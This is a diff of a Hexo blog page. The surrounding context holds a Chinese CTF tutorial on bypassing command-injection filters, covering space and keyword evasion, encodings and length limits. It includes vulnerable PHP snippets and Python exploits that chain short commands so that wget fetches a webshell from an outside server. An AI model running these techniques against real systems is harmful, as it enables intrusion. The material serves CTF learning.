@@ -78,7 +78,7 @@
           <img src="/img/avatar.jpg">
         </a>
         <hgroup class="introduce">
-          <h5 class="nickname">七友</h5>
+          <h5 class="nickname"></h5>
           <a href="mailto:1920854803@qq.com" title="1920854803@qq.com" class="mail">1920854803@qq.com</a>
         </hgroup>
       </div>
@@ -303,31 +303,127 @@ m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配
 [[:lower:]] 任何小写字母
 [[:punct:]] 任何标点符号
 [[:xdigit:]] 任何16进制的数字，相当于[0-9a-fA-F]
-</code></pre><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h2 id="一些常见的限制"><a href="#一些常见的限制" class="headerlink" title="一些常见的限制"></a>一些常见的限制</h2><h3 id="通配符-和-的使用"><a href="#通配符-和-的使用" class="headerlink" title="通配符*和?的使用"></a>通配符<code>*</code>和<code>?</code>的使用</h3><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120174451-083fa032-1c98-1.png" alt="image.png"></p>
-<h3 id="和-的使用"><a href="#和-的使用" class="headerlink" title="[]和{}的使用"></a>[]和{}的使用</h3><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120174709-5a7fea96-1c98-1.png" alt="image.png"></p>
+</code></pre><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h2 id="一些常见的限制"><a href="#一些常见的限制" class="headerlink" title="一些常见的限制"></a>一些常见的限制</h2><h3 id="通配符-和-的使用"><a href="#通配符-和-的使用" class="headerlink" title="通配符*和?的使用"></a>通配符<code>*</code>和<code>?</code>的使用</h3><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120174451-083fa032-1c98-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<h3 id="和-的使用"><a href="#和-的使用" class="headerlink" title="[]和{}的使用"></a>[]和{}的使用</h3><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120174709-5a7fea96-1c98-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
 <p>{…}与[…]有一个很重要的区别。如果匹配的文件不存在，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开。</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120174912-a3cd3eba-1c98-1.png" alt="image.png"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120174912-a3cd3eba-1c98-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
 <h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>使用&lt;和&gt;</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120175948-1f648e6a-1c9a-1.png" alt="image.png"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120175948-1f648e6a-1c9a-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
 <p>使用特殊变量:<code>$IFS</code></p>
 <pre><code>IFS的默认值为：空白（包括：空格，tab, 和新行)
-</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120180235-82c6e07a-1c9a-1.png" alt="image.png"></p>
-<h3 id="关键字过滤绕过"><a href="#关键字过滤绕过" class="headerlink" title="关键字过滤绕过"></a>关键字过滤绕过</h3><p>使用<code>$*</code>和<code>$@</code>，<code>$x</code>(x代表1-9),<code>${x}</code>(x&gt;=10)<br>PS：因为在没有传参的情况下，上面的特殊变量都是为空的<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120180631-0f960c1a-1c9b-1.png" alt="image.png"></p>
+</code></pre><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120180235-82c6e07a-1c9a-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<h3 id="关键字过滤绕过"><a href="#关键字过滤绕过" class="headerlink" title="关键字过滤绕过"></a>关键字过滤绕过</h3><p>使用<code>$*</code>和<code>$@</code>，<code>$x</code>(x代表1-9),<code>${x}</code>(x&gt;=10)<br>PS：因为在没有传参的情况下，上面的特殊变量都是为空的<br></p><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120180631-0f960c1a-1c9b-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure><p></p>
 <p>使用反斜杠</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120180724-2eeda8de-1c9b-1.png" alt="image.png"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120180724-2eeda8de-1c9b-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
 <p>使用变量</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120180945-82ca6a28-1c9b-1.png" alt="image.png"></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120183457-0887a146-1c9f-1.png" alt="image.png"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120180945-82ca6a28-1c9b-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120183457-0887a146-1c9f-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
 <p>使用特殊变量${9}</p>
 <pre><code>${9}对应空字符串
-</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120181515-47fd220e-1c9c-1.png" alt="image.png"></p>
-<p>使用编码<br>base64<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120181135-c499e8ca-1c9b-1.png" alt="image.png"><br>16进制<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120182144-2fae337c-1c9d-1.png" alt="image.png"></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120185231-7cab65c4-1ca1-1.png" alt="image.png"></p>
-<p>8进制<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120185020-2e5c14cc-1ca1-1.png" alt="image.png"></p>
+</code></pre><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120181515-47fd220e-1c9c-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>使用编码<br>base64<br></p><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120181135-c499e8ca-1c9b-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure><br>16进制<br><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120182144-2fae337c-1c9d-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure><p></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120185231-7cab65c4-1ca1-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>8进制<br></p><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120185020-2e5c14cc-1ca1-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure><p></p>
 <p>使用双引号和单引号</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120181255-f41fd258-1c9b-1.png" alt="image.png"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120181255-f41fd258-1c9b-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
 <p>花括号还有一种用法：{command,argument}，</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120205644-d68d3ee4-1cb2-1.png" alt="image.png"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120205644-d68d3ee4-1cb2-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
 <p>使用<code>%0a(\n)</code>，<code>%0d(\r)</code>，<code>%09(\t)</code>等字符也可以bypass一些过滤，这里就会不多去赘述了</p>
 <h2 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h2><h3 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
     <span class="token variable">$param</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
@@ -336,7 +432,13 @@ m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配
     <span class="token punctuation">}</span>
 <span class="token delimiter">?></span>
 </code></pre>
-<p>很简单，长度不能大于等于17，直接在eval里面再用一个eval就可以了。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120211733-bf383cdc-1cb5-1.png" alt="image.png"></p>
+<p>很简单，长度不能大于等于17，直接在eval里面再用一个eval就可以了。<br></p><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120211733-bf383cdc-1cb5-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure><p></p>
 <h3 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
     <span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -344,7 +446,13 @@ m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配
 <span class="token delimiter">?></span>
 </code></pre>
 <p>这里要用到我们前面所讲到的重定向，<code>n &gt; file</code>：将文件描述符为 n 的文件重定向到 file。<br>既然我们不能一次执行一条完整的命令，我们可以分为多次<br>举个简单的例子</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120221721-1a28f340-1cbe-1.png" alt="image.png"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120221721-1a28f340-1cbe-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
 <p>ls是默认以文件名排序的，所以我们为了控制我们命令的顺序，可以使用ls -t按时间逆序。<br>不过这里考虑到直接写shell有点麻烦（因为php中的一些符号用到shell中是有意义的，要各种转义，为了节省代码量我们直接用curl或者是wget从服务器dump一个shell下来）<br>exp如下：</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
 name<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">">php\\"</span><span class="token punctuation">,</span><span class="token string">">\\ 1.\\\\"</span><span class="token punctuation">,</span><span class="token string">">\\ -O\\\\"</span><span class="token punctuation">,</span><span class="token string">">cn\\\\"</span><span class="token punctuation">,</span><span class="token string">">\\ a.\\\\"</span><span class="token punctuation">,</span><span class="token string">">wget\\\\"</span><span class="token punctuation">]</span>
@@ -365,7 +473,14 @@ b<span class="token operator">=</span>requests<span class="token punctuation">.<
 <span class="token keyword">else</span><span class="token punctuation">:</span>
     <span class="token keyword">print</span> <span class="token string">"bad!"</span>
 </code></pre>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120235756-271eed3a-1ccc-1.png" alt="image.png"><br>可以发现成功写了shell</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120235756-271eed3a-1ccc-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>可以发现成功写了shell</p>
 <h3 id="例题3"><a href="#例题3" class="headerlink" title="例题3"></a>例题3</h3><p>HITCON CTF 2017-BabyFirst Revenge</p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/www/sandbox/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"orange"</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -379,7 +494,14 @@ b<span class="token operator">=</span>requests<span class="token punctuation">.<
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 </code></pre>
 <p>这个字符长度限制不能大于5个，我们写字符还是可以的，但是我们的<code>ls -t&gt;a</code>用不了，不过我们可以用前面的思路，把<code>ls -t&gt;a</code>拆分为几段放在一个文件中，然后再执行。</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190121100854-811f807e-1d21-1.png" alt="image.png"><br>可以发现2-5行是可以执行<code>ls -t&gt;g</code>的，然后后面的步骤就和前面一题一样了，这里就不多赘述了<br>贴一下Orange师傅的exp：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190121100854-811f807e-1d21-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>可以发现2-5行是可以执行<code>ls -t&gt;g</code>的，然后后面的步骤就和前面一题一样了，这里就不多赘述了<br>贴一下Orange师傅的exp：</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
 <span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
 <span class="token keyword">from</span> urllib <span class="token keyword">import</span> quote
@@ -455,8 +577,8 @@ payload <span class="token operator">=</span> <span class="token punctuation">[<
     
     <footer>
         <a href="https://byqiyou.github.io">
-            <img src="/img/avatar.jpg" alt="七友">
-            七友
+            <img src="/img/avatar.jpg" alt="">
+            
         </a>
     </footer>
 </blockquote>
@@ -628,7 +750,7 @@ payload <span class="token operator">=</span> <span class="token punctuation">[<
         </p>
     </div>
     <div class="bottom">
-        <p><span>七友 &copy; 2015 - 2019</span>
+        <p><span> &copy; 2015 - 2019</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
@@ -731,10 +853,10 @@ var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
     var OriginTitile = document.title, titleTime;
     document.addEventListener('visibilitychange', function() {
         if (document.hidden) {
-            document.title = '死鬼去哪里了！';
+            document.title = 'Leave';
             clearTimeout(titleTime);
         } else {
-            document.title = '(つェ⊂)咦!又好了!';
+            document.title = 'Come back';
             titleTime = setTimeout(function() {
                 document.title = OriginTitile;
             },2000);
